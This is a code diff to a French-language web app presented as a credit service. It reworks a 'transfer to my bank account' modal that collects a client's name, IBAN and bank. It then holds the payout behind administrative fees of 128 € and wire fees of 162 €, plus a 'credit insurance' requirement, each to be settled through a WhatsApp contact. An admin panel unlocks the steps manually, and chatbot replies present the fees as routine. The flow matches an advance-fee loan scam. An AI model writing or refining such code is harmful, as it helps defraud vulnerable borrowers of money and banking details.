@@ -803,9 +803,9 @@
             </div>
         </div>
 
-        <div id="transferStepDisplay" style="margin:0.8rem 0 0.5rem; font-size:0.9rem; color:#5b6f87;">Étape 1/5</div>
+        <div id="transferStepDisplay" style="margin:0.8rem 0 0.5rem; font-size:0.9rem; color:#5b6f87;">Étape 1/3</div>
         <div id="transferProgress" style="width:100%; height:6px; background:#dce3ed; border-radius:4px; margin:0.5rem 0 1rem; overflow:hidden;">
-            <div id="transferProgressBar" style="height:100%; width:10%; background:#2a7de1; border-radius:4px; transition:width 0.3s;"></div>
+            <div id="transferProgressBar" style="height:100%; width:33%; background:#2a7de1; border-radius:4px; transition:width 0.3s;"></div>
         </div>
 
         <div class="fee-amount" id="transferFeeDisplay" style="display:none;">198 €</div>
@@ -1342,17 +1342,14 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     }
 
-    // ===== TRANSFERT BANCAIRE AVEC PERSISTANCE SUPABASE =====
+    // ===== TRANSFERT BANCAIRE (3 ÉTAPES) =====
     let transferStep = 0;
     let transferData = { fullName: '', iban: '', bankName: '', amount: 0 };
     let adminUnlocked = false;
     let transferSessionId = null;
     let transferRealtimeChannel = null;
 
-    // Fonctions pour interagir avec la table transfer_sessions
     async function getTransferSession(userId) {
-        // Toujours récupérer la session la plus récente de cet utilisateur.
-        // Cela évite qu'une ancienne session ou un doublon fasse repartir le transfert à l'étape 1.
         const { data, error } = await localDB
             .from('transfer_sessions')
             .select('*')
@@ -1376,9 +1373,6 @@ document.addEventListener('DOMContentLoaded', function () {
             updated_at: new Date().toISOString()
         };
 
-        // Ne jamais dépendre de transferSessionId : l'administrateur et le client
-        // ont des contextes JS différents. On recherche donc toujours la session
-        // par user_id avant de décider entre UPDATE et INSERT.
         const { data: existing, error: findError } = await localDB
             .from('transfer_sessions')
             .select('id')
@@ -1407,7 +1401,6 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     }
 
-    // Charger la session au moment d'ouvrir le modal
     async function loadTransferSession() {
         const { data: userData } = await localDB.auth.getUser();
         const user = userData.user;
@@ -1425,7 +1418,6 @@ document.addEventListener('DOMContentLoaded', function () {
                 transferData.amount = session.amount || 0;
                 return session;
             } else {
-                // Créer une session par défaut
                 transferStep = 0;
                 adminUnlocked = false;
                 transferData = { fullName: '', iban: '', bankName: '', amount: 0 };
@@ -1445,7 +1437,6 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     }
 
-    // S'abonner aux changements en temps réel de la session
     function subscribeTransferSession(userId) {
         if (transferRealtimeChannel) {
             localDB.removeChannel(transferRealtimeChannel);
@@ -1466,7 +1457,6 @@ document.addEventListener('DOMContentLoaded', function () {
                     transferData.iban = newData.iban || '';
                     transferData.bankName = newData.bank_name || '';
                     transferData.amount = newData.amount || 0;
-                    // Si le modal est ouvert, on le rafraîchit
                     const modal = document.getElementById('transferModal');
                     if (modal.classList.contains('open')) {
                         renderTransferStep(transferStep);
@@ -1476,14 +1466,10 @@ document.addEventListener('DOMContentLoaded', function () {
             .subscribe();
     }
 
-    // Fonction pour débloquer (appelée par l'admin après changement de statut)
     async function adminUnlockTransfer(userId) {
         try {
             const session = await getTransferSession(userId);
             if (!session) return;
-
-            // IMPORTANT : on conserve exactement l'étape atteinte par le client.
-            // Le changement de statut admin ne doit jamais remettre step à 0 ou à 1.
             const { error } = await localDB
                 .from('transfer_sessions')
                 .update({
@@ -1491,14 +1477,12 @@ document.addEventListener('DOMContentLoaded', function () {
                     updated_at: new Date().toISOString()
                 })
                 .eq('id', session.id);
-
             if (error) throw error;
         } catch (e) {
             console.error('Erreur déblocage admin:', e);
         }
     }
 
-    // Ouvrir la modale de transfert
     async function transferFunds() {
         const { data: userData } = await localDB.auth.getUser();
         const user = userData.user;
@@ -1519,12 +1503,9 @@ document.addEventListener('DOMContentLoaded', function () {
             return;
         }
 
-        // Charger la session
         await loadTransferSession();
-        // S'abonner aux mises à jour
         subscribeTransferSession(user.id);
 
-        // Remplir les champs avec les données chargées
         const fullNameInput = document.getElementById('transferFullName');
         const ibanInput = document.getElementById('transferBankAccount');
         const bankNameInput = document.getElementById('transferBankName');
@@ -1535,18 +1516,15 @@ document.addEventListener('DOMContentLoaded', function () {
         bankNameInput.value = transferData.bankName;
         amountInput.value = transferData.amount || '';
 
-        // Ajuster le max
         amountInput.max = Number(profile?.balance || 0).toFixed(2);
 
-        // Afficher le modal
         const modal = document.getElementById('transferModal');
         modal.classList.add('open');
-
-        // Rendre l'étape actuelle
         renderTransferStep(transferStep);
     }
 
-    function renderTransferStep(step) {
+    // ===== NOUVEAU renderTransferStep (3 étapes) =====
+    async function renderTransferStep(step) {
         const modal = document.getElementById('transferModal');
         if (!modal.classList.contains('open')) return;
 
@@ -1560,12 +1538,8 @@ document.addEventListener('DOMContentLoaded', function () {
         const stepDisplay = document.getElementById('transferStepDisplay');
         const messageDiv = document.getElementById('transferMessage');
         const fieldsDiv = document.getElementById('transferStep1Fields');
-        const fullNameInput = document.getElementById('transferFullName');
-        const ibanInput = document.getElementById('transferBankAccount');
-        const bankNameInput = document.getElementById('transferBankName');
-        const amountInput = document.getElementById('transferAmount');
 
-        // Masquer tous les éléments par défaut
+        // Masquer tous les éléments
         fieldsDiv.style.display = 'none';
         feeDisplay.style.display = 'none';
         subtext.style.display = 'none';
@@ -1576,102 +1550,36 @@ document.addEventListener('DOMContentLoaded', function () {
         statusDiv.style.display = 'none';
         statusDiv.textContent = '';
 
-        // Mettre à jour la barre de progression
-        const progress = ((step + 1) / 5) * 100;
+        const totalSteps = 3;
+        const progress = ((step + 1) / totalSteps) * 100;
         progressBar.style.width = progress + '%';
-        stepDisplay.textContent = `Étape ${step + 1}/5`;
+        stepDisplay.textContent = `Étape ${step + 1}/${totalSteps}`;
 
-        // Déterminer si l'étape est bloquée (nécessite admin_unlocked pour continuer)
-        const blockedSteps = [1, 2, 4]; // 1=admin fees, 2=virement fees, 4=insurance
-        const isBlocked = blockedSteps.includes(step);
-        const canProceed = !isBlocked || adminUnlocked;
-
-        // Étape 0 : coordonnées
+        // Étape 0 : coordonnées bancaires
         if (step === 0) {
-            stepDisplay.textContent = 'Étape 1/5 – Coordonnées bancaires';
+            stepDisplay.textContent = 'Étape 1/3 – Coordonnées bancaires';
             fieldsDiv.style.display = 'block';
             messageDiv.innerHTML = 'Veuillez renseigner les coordonnées de votre compte bancaire.';
             confirmBtn.style.display = 'inline-block';
             confirmBtn.textContent = 'Valider';
             confirmBtn.disabled = false;
-            // On cache les autres
             continueBtn.style.display = 'none';
             supportBtn.style.display = 'none';
             return;
         }
 
-        // Étapes 1,2,3,4,5
-        // On masque les champs
-        fieldsDiv.style.display = 'none';
-
-        // Cas particuliers
+        // Étape 1 : récapitulatif + frais
         if (step === 1) {
-            stepDisplay.textContent = 'Étape 2/5 – Frais administratifs';
-            messageDiv.innerHTML = `
-                <p><strong>Cher client,</strong></p>
-                <p>Nous vous informons qu’afin de finaliser le traitement de votre demande de transfert et permettre la poursuite de votre opération bancaire, des frais administratifs de traitement d’un montant de <strong>198 €</strong> sont à régler.</p>
-                <p>Pour obtenir les informations bancaires nécessaires au règlement ainsi que les détails relatifs à cette opération, nous vous invitons à contacter directement l’administrateur en charge de votre dossier.</p>
-                <p>Nous restons à votre disposition pour toute information complémentaire.</p>
-                <p style="margin-top:1rem;"><strong>Cordialement,</strong><br>Le service administratif</p>
-                <p style="margin-top:0.5rem; color:#a12b2b;"><strong>Statut du compte : En attente</strong></p>
-            `;
-            feeDisplay.style.display = 'block';
-            feeDisplay.textContent = '198 €';
-            subtext.style.display = 'block';
-            subtext.textContent = 'Frais administratifs de traitement.';
-            // Bloqué ? on affiche support, sinon confirm
-            if (canProceed) {
-                confirmBtn.style.display = 'inline-block';
-                confirmBtn.textContent = 'Continuer vers l\'étape suivante';
-                confirmBtn.disabled = false;
-                supportBtn.style.display = 'none';
-            } else {
-                confirmBtn.style.display = 'none';
-                supportBtn.style.display = 'inline-block';
-                supportBtn.textContent = '📞 Contacter le support';
-                supportBtn.onclick = function() {
-                    window.open('https://wa.me/447520682877', '_blank');
-                };
-            }
-            return;
-        }
+            stepDisplay.textContent = 'Étape 2/3 – Récapitulatif';
+            const fullName = transferData.fullName || document.getElementById('transferFullName').value.trim() || '—';
+            const iban = transferData.iban || document.getElementById('transferBankAccount').value.trim() || '—';
+            const bankName = transferData.bankName || document.getElementById('transferBankName').value.trim() || '—';
+            const amount = transferData.amount || parseFloat(document.getElementById('transferAmount').value) || 0;
+            const tracking = document.getElementById('dashTracking').textContent || '—';
 
-        if (step === 2) {
-            stepDisplay.textContent = 'Étape 3/5 – Frais de virement';
-            messageDiv.innerHTML = `
-                <p><strong>Cher client,</strong></p>
-                <p>Nous vous informons qu’afin de finaliser le traitement de votre demande de transfert et permettre la poursuite de votre opération bancaire, des frais de virement d’un montant de <strong>150 €</strong> sont à régler.</p>
-                <p>Pour obtenir les informations bancaires nécessaires au règlement ainsi que les détails relatifs à cette opération, nous vous invitons à contacter directement l’administrateur en charge de votre dossier.</p>
-                <p>Nous restons à votre disposition pour toute information complémentaire.</p>
-                <p style="margin-top:1rem;"><strong>Cordialement,</strong><br>Le service administratif</p>
-            `;
-            feeDisplay.style.display = 'block';
-            feeDisplay.textContent = '150 €';
-            subtext.style.display = 'block';
-            subtext.textContent = 'Frais de virement.';
-            if (canProceed) {
-                confirmBtn.style.display = 'inline-block';
-                confirmBtn.textContent = 'Continuer vers l\'étape suivante';
-                confirmBtn.disabled = false;
-                supportBtn.style.display = 'none';
-            } else {
-                confirmBtn.style.display = 'none';
-                supportBtn.style.display = 'inline-block';
-                supportBtn.textContent = '📞 Contacter le support';
-                supportBtn.onclick = function() {
-                    window.open('https://wa.me/447520682877', '_blank');
-                };
-            }
-            return;
-        }
-
-        if (step === 3) {
-            stepDisplay.textContent = 'Étape 4/5 – Relevé récapitulatif';
-            const fullName = document.getElementById('transferFullName').value.trim() || transferData.fullName;
-            const iban = document.getElementById('transferBankAccount').value.trim() || transferData.iban;
-            const bankName = document.getElementById('transferBankName').value.trim() || transferData.bankName;
-            const amount = parseFloat(document.getElementById('transferAmount').value) || transferData.amount || 0;
-            const tracking = document.getElementById('dashTracking').textContent || '---';
+            const fraisAdmin = 128.00;
+            const fraisVirement = 162.00;
+            const totalFrais = fraisAdmin + fraisVirement;
 
             messageDiv.innerHTML = `
                 <h3 style="color:#0f2b4b; margin-bottom:0.5rem;">Relevé de l'opération</h3>
@@ -1682,41 +1590,41 @@ document.addEventListener('DOMContentLoaded', function () {
                     <p><strong>Banque :</strong> ${bankName}</p>
                     <p><strong>Montant demandé :</strong> ${amount.toFixed(2)} €</p>
                     <hr style="border:1px dashed #dce3ed; margin:0.7rem 0;">
-                    <p><strong>Frais administratifs :</strong> 198,00 €</p>
-                    <p><strong>Frais de virement :</strong> 150,00 €</p>
-                    <p><strong>Total des frais :</strong> 348,00 €</p>
+                    <p><strong>Frais administratifs :</strong> ${fraisAdmin.toFixed(2)} €</p>
+                    <p><strong>Frais de virement :</strong> ${fraisVirement.toFixed(2)} €</p>
+                    <p><strong>Total des frais :</strong> ${totalFrais.toFixed(2)} €</p>
                     <hr style="border:1px dashed #dce3ed; margin:0.7rem 0;">
                     <p style="font-weight:600; color:#0f2b4b;">Cher client,</p>
                     <p>Veuillez contacter votre administrateur pour vous acquitter des frais de transfert afin de faire évoluer votre opération bancaire.</p>
                 </div>
             `;
+
             feeDisplay.style.display = 'none';
             subtext.style.display = 'none';
-            // Étape 3 : toujours afficher le bouton support
+
             supportBtn.style.display = 'inline-block';
             supportBtn.textContent = '📞 Contacter le support';
             supportBtn.onclick = function() {
                 window.open('https://wa.me/447520682877', '_blank');
             };
-            // Si admin a débloqué, afficher un bouton "Continuer" pour passer à l'étape 5
+
             if (adminUnlocked) {
                 continueBtn.style.display = 'inline-block';
                 continueBtn.textContent = 'Continuer vers l\'étape suivante';
                 continueBtn.onclick = async function() {
-                    // Passer à l'étape 4 (insurance)
                     const { data: userData } = await localDB.auth.getUser();
                     if (userData.user) {
                         await upsertTransferSession(userData.user.id, {
-                            step: 4,
-                            admin_unlocked: false, // on verrouille la prochaine
+                            step: 2,
+                            admin_unlocked: false,
                             fullName: transferData.fullName,
                             iban: transferData.iban,
                             bankName: transferData.bankName,
                             amount: transferData.amount
                         });
-                        transferStep = 4;
+                        transferStep = 2;
                         adminUnlocked = false;
-                        renderTransferStep(4);
+                        renderTransferStep(2);
                     }
                 };
             } else {
@@ -1725,35 +1633,25 @@ document.addEventListener('DOMContentLoaded', function () {
             return;
         }
 
-        if (step === 4) {
-            stepDisplay.textContent = 'Étape 5/5 – Frais d’assurance';
+        // Étape 2 : assurance crédit
+        if (step === 2) {
+            stepDisplay.textContent = 'Étape 3/3 – Assurance crédit';
             messageDiv.innerHTML = `
                 <p><strong>Cher client,</strong></p>
-                <p>Nous vous remercions pour votre confiance. Dans le cadre de la finalisation de votre demande de crédit, une assurance crédit est requise conformément à notre procédure administrative.</p>
-                <p>Nous vous invitons à contacter l’administrateur chargé de votre dossier afin d’obtenir votre contrat d’assurance pour consultation et signature.</p>
-                <p>Nous restons à votre disposition pour vous accompagner dans cette démarche.</p>
+                <p>En raison de votre statut de nouveau demandeur de crédit, vous devez souscrire à une assurance crédit pour le présent financement afin de garantir la solvabilité des échéances à bonne date.</p>
+                <p>Veuillez contacter le support pour obtenir votre contrat d'assurance.</p>
                 <p style="margin-top:1rem;"><strong>Cordialement,</strong><br>Le Service Administratif</p>
             `;
-            feeDisplay.style.display = 'block';
-            feeDisplay.textContent = '?? €';
-            subtext.style.display = 'block';
-            subtext.textContent = 'Frais d’assurance (montant communiqué par l’administrateur).';
-            if (canProceed) {
-                // On pourrait avoir une action finale, mais on laisse support
-                confirmBtn.style.display = 'none';
-                supportBtn.style.display = 'inline-block';
-                supportBtn.textContent = '📞 Contacter le support';
-                supportBtn.onclick = function() {
-                    window.open('https://wa.me/447520682877', '_blank');
-                };
-            } else {
-                confirmBtn.style.display = 'none';
-                supportBtn.style.display = 'inline-block';
-                supportBtn.textContent = '📞 Contacter le support';
-                supportBtn.onclick = function() {
-                    window.open('https://wa.me/447520682877', '_blank');
-                };
-            }
+            feeDisplay.style.display = 'none';
+            subtext.style.display = 'none';
+
+            supportBtn.style.display = 'inline-block';
+            supportBtn.textContent = '📞 Contacter le support';
+            supportBtn.onclick = function() {
+                window.open('https://wa.me/447520682877', '_blank');
+            };
+            confirmBtn.style.display = 'none';
+            continueBtn.style.display = 'none';
             return;
         }
 
@@ -1763,12 +1661,11 @@ document.addEventListener('DOMContentLoaded', function () {
         continueBtn.style.display = 'none';
     }
 
-    // Gestion des clics sur le bouton principal (étape 0, ou étapes débloquées)
+    // Gestion du clic sur le bouton principal (étape 0 uniquement)
     async function handleTransferRequest() {
         const confirmBtn = document.getElementById('confirmTransferBtn');
         if (confirmBtn.disabled) return;
 
-        // Étape 0 : validation des coordonnées
         if (transferStep === 0) {
             const fullName = document.getElementById('transferFullName').value.trim();
             const iban = document.getElementById('transferBankAccount').value.trim();
@@ -1802,31 +1699,12 @@ document.addEventListener('DOMContentLoaded', function () {
             return;
         }
 
-        // Pour les étapes débloquées (1,2)
-        if (transferStep === 1 || transferStep === 2) {
-            // Avancer à l'étape suivante
-            const nextStep = transferStep + 1;
-            const { data: userData } = await localDB.auth.getUser();
-            if (userData.user) {
-                await upsertTransferSession(userData.user.id, {
-                    step: nextStep,
-                    admin_unlocked: false, // on reverrouille
-                    fullName: transferData.fullName,
-                    iban: transferData.iban,
-                    bankName: transferData.bankName,
-                    amount: transferData.amount
-                });
-                transferStep = nextStep;
-                adminUnlocked = false;
-                renderTransferStep(transferStep);
-            }
-        }
+        // Pour les autres étapes, on ne fait rien via ce bouton
     }
 
     // Écouteurs de la modale de transfert
     document.getElementById('transferFundsBtn').addEventListener('click', transferFunds);
     document.getElementById('confirmTransferBtn').addEventListener('click', handleTransferRequest);
-    // Le bouton "Continuer" (pour étape 3) est géré via son onclick dans renderTransferStep
     document.getElementById('closeTransferBtn').addEventListener('click', function() {
         document.getElementById('transferModal').classList.remove('open');
     });
@@ -1834,7 +1712,7 @@ document.addEventListener('DOMContentLoaded', function () {
         if (e.target === this) this.classList.remove('open');
     });
 
-    // ===== ADMIN : VISUALISATION DES DOCUMENTS (24 MOIS) =====
+    // ===== ADMIN : VISUALISATION DES DOCUMENTS =====
     const docModal = document.getElementById('docModal');
     const docModalClose = document.getElementById('docModalClose');
     const docModalTitle = document.getElementById('docModalTitle');
@@ -1862,7 +1740,7 @@ document.addEventListener('DOMContentLoaded', function () {
             const docItems = await Promise.all(docs.map(async (doc) => {
                 const { data: signedUrlData, error: urlError } = await localDB.storage
                     .from('documents')
-                    .createSignedUrl(doc.file_path, 60 * 60 * 24 * 365 * 2); // 24 mois
+                    .createSignedUrl(doc.file_path, 60 * 60 * 24 * 365 * 2);
                 if (urlError || !signedUrlData) {
                     return { ...doc, signedUrl: null, error: urlError?.message || 'Lien indisponible' };
                 }
@@ -1941,9 +1819,9 @@ document.addEventListener('DOMContentLoaded', function () {
         'délai': 'Après validation de votre dossier, le versement est effectué dans les plus brefs délais (généralement sous 48h).',
         'urgence': 'Pour une urgence, contactez-nous directement par WhatsApp, nous traitons les demandes prioritairement.',
         'sécurité': 'Vos données sont protégées conformément au RGPD. Nous ne partageons aucune information avec des tiers.',
-        'transfert': 'Pour effectuer un transfert bancaire, connectez-vous à votre espace client et cliquez sur « Transférer vers mon compte bancaire ». Vous devrez fournir vos coordonnées bancaires (nom, IBAN, banque) et suivre les étapes. Des frais administratifs (198 €), de virement (150 €) et d’assurance peuvent s’appliquer.',
-        'frais': 'Les frais de transfert comprennent des frais administratifs de 198 €, des frais de virement de 150 € et éventuellement des frais d\'assurance (montant communiqué par l\'administrateur). Le détail vous est présenté lors de la procédure.',
-        'iban': 'Votre IBAN est demandé lors de la procédure de transfert. Assurez-vous de le saisir correctement. Si vous ne le connaissez pas, vous pouvez le trouver sur votre relevé bancaire.'
+        'transfert': 'Pour effectuer un transfert bancaire, connectez-vous à votre espace client et cliquez sur « Transférer vers mon compte bancaire ». Vous devrez fournir vos coordonnées bancaires (nom, IBAN, banque) et suivre les 3 étapes. Des frais administratifs (128 €), de virement (162 €) et éventuellement d’assurance peuvent s’appliquer.',
+        'frais': 'Les frais de transfert comprennent des frais administratifs de 128 €, des frais de virement de 162 € et éventuellement des frais d\'assurance. Le détail vous est présenté lors de la procédure.',
+        'iban': 'Votre IBAN est demandé lors de la procédure de transfert. Assurez-vous de le saisir correctement.'
     };
 
     function getBotReply(userMessage) {
@@ -1960,7 +1838,7 @@ document.addEventListener('DOMContentLoaded', function () {
         if (msg.includes('transfert') || msg.includes('virement') || msg.includes('banque') || msg.includes('compte') && (msg.includes('transfer') || msg.includes('envoyer'))) return botReplies.transfert;
         if (msg.includes('frais') || msg.includes('coût') || msg.includes('prix') || msg.includes('tarif')) return botReplies.frais;
         if (msg.includes('iban') || msg.includes('rib') || msg.includes('compte bancaire')) return botReplies.iban;
-        return "Je n’ai pas compris votre question. Pour toute demande précise, n’hésitez pas à contacter notre service client par WhatsApp ou par e-mail. Je suis là pour vous guider sur nos offres de crédit, les taux, les documents et les délais.";
+        return "Je n’ai pas compris votre question. Pour toute demande précise, n’hésitez pas à contacter notre service client par WhatsApp ou par e-mail.";
     }
 
     function addMessage(sender, text) {
@@ -2481,7 +2359,6 @@ document.addEventListener('DOMContentLoaded', function () {
             } catch(e){alert(e.message);} finally{btn.disabled=false;}
         }));
 
-        // Nouveau bouton "Documents"
         adminClientList.querySelectorAll('.admin-docs-btn').forEach(btn=>btn.addEventListener('click', function() {
             const card = this.closest('.admin-client-card');
             const userId = card.dataset.userId;
@@ -2581,13 +2458,12 @@ document.addEventListener('DOMContentLoaded', function () {
             }
         }));
 
-        // === MODIFICATION DU BOUTON "Modifier le statut du compte" pour débloquer le transfert ===
+        // Modification du bouton "Modifier le statut du compte" pour débloquer le transfert
         adminClientList.querySelectorAll('.admin-status-btn').forEach(btn=>btn.addEventListener('click',async()=>{
             const card=btn.closest('.admin-client-card'), userId=card.dataset.userId, status=card.querySelector('.admin-status-select').value, note=card.querySelector('.admin-status-note').value.trim();
             try {
                 const {error}=await localDB.from('profiles').update({account_status:status}).eq('id',userId);
                 if(error)throw error;
-                // Si le nouveau statut est 'active', on débloque le transfert
                 if (status === 'active') {
                     await adminUnlockTransfer(userId);
                 }
